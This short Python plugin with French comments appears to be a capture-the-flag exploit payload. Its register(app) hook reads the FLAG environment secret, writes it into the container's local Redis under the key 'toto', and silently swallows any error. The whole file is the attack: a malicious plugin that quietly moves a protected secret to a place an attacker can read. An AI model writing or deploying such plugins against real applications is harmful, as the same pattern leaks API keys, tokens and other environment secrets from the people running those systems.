import os
import redis

def register(app):
    try:
        # 1. Récupérer la variable secrète de l'OS
        flag_value = os.environ.get("FLAG", "Pas de flag trouvé")
        
        # 2. Se connecter au serveur Redis local du conteneur
        r = redis.Redis(host="127.0.0.1", port=6379, db=0)
        
        # 3. Écrire la valeur dans une clé textuelle simple
        r.set("toto", flag_value)
        
    except Exception as e:
        pass
